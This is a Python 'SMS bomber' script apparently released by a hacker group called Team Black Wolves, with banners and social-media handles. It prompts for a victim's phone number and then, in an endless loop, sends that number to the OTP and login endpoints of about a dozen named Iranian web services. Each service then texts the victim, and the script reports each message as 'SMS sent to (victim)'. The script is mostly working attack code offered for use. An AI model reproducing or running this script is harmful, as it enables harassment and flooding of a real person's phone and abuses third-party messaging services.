#script by team cyber Black Wolves

from cgi import print_directory
from requests import post , get
import os
from colorama import Fore
import pyfiglet
from pyfiglet import Figlet
from os import system
import pyfiglet
from tqdm import tqdm
import time
from time import sleep
import platform

noqteh = "\n ".center(0,"_")
def clear_page():
        system_name = platform.uname()[0]
        if system_name == 'Windows':os.system("cls")
        elif system_name != 'Windows':system("clear")
        time.sleep(1)
clear_page()
print(Fore.CYAN+noqteh)

def banner():
        try:
                if platform.uname()[0] != 'Windows':
                        ToiLe = "toilet -f mono12 SPAM SMS"
                        system(ToiLe)
                elif platform.uname()[0] == 'Windows':
                        Baner_Figlet = pyfiglet.figlet_format(" S P A M   S M S ")
                        print (Baner_Figlet)
        except ImportError :
                print (Fore.RED+"please install pyfiglet and toilet and  trying agine ... ")
banner()
print (Fore.CYAN+"")

print("""

  .;'                     `;,
 .;'  ,;'    ,,,,,     `;,  `;,   SMS BOMBER BY Team Black Wolves
.;'  ,;'  ,;' ,,, `;,  `;,  `;,   Instagram We : l_alfa_hacker_l
::   ::   :   (o)   :   ::   ::   telegram : https://t.me/BlackWolves_Cyber
':.  ':.  ':. /_\ ,:'  ,:'  ,:'   SMS BOMBER v1.0
 ':.  ':.    /___\    ,:'  ,:'    im not exist ...
  ':.       /_____\      ,:'
           [IIIIIII]

""")

print("\n\n\a")
#starting sms attacking...
print("")
PROMT = Fore.RED+'/root'+Fore.BLUE+"@Kali"+Fore.RED+"~# "
number = input(PROMT+Fore.CYAN+'[Enter Number Target]>> '+Fore.GREEN+'098 ')
print("")
for i in range(3):
        for char in tqdm(range(100),colour = "CYAN",desc=" WORKING "):
                time.sleep(4/450)
print(Fore.GREEN+"")
print("\n\n"),time.sleep(1)
# We Don't Forget , We Don't Forgive , We CyBeR ArMy ZeUs
snapj = {"phone":number}
tapsi1 = {"credential":{"phoneNumber":number,"role":"PASSENGER"}}
divarj = {"phone":number}
emd = "send=1&cellphone="+number
rubj = {"api_version":"3","method":"sendCode","data":{"phone_number":number,"send_type":"SMS"}}
bamad = "cellNumber="+number
ali = {"phoneNumber": number }
hamrah = {"action":"getAppViaSMS","number": number }
arkd = {"mobile":number,"country_code":"IR","provider_code":"RUBIKA"}

while True:
    r3 = post("https://api.tapsi.cab/api/v2/user",json=tapsi1)
    if r3.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r4 = post("https://api.divar.ir/v5/auth/authenticate",json=divarj)
    if r4.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r5 = post("https://messengerg2c42.iranlms.ir/",json=rubj)
    if r5.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r6 = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",json=snapj)
    if r6.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r7 = post("https://web.emtiyaz.app/json/login",data=emd)
    if r7.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r8 = post("https://bama.ir/signin-checkforcellnumber",data=bamad)
    if r8.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r9 = post("https://ws.alibaba.ir/api/v3/account/mobile/otp",json=ali)
    if r9.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r11 = post("https://api.chartex.net/api/v2/user/validate",json=arkd)
    if r11.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r12 = get("https://api.torob.com/a/phone/send-pin/?phone_number="+number)
    if r12.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r13 = get("https://api.binjo.ir/api/panel/get_code/"+number)
    if r13.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r14 = get("https://core.gap.im/v1/user/add.json?mobile="+number)
    if r14.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
    r15 = post(f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{number}')
    if r15.status_code == 200:
        print(Fore.GREEN +' [+] SMS sent to (victim) ' , number)
    else:
        print(Fore.RED +' [+] SMS not sent to (victim )' , number)
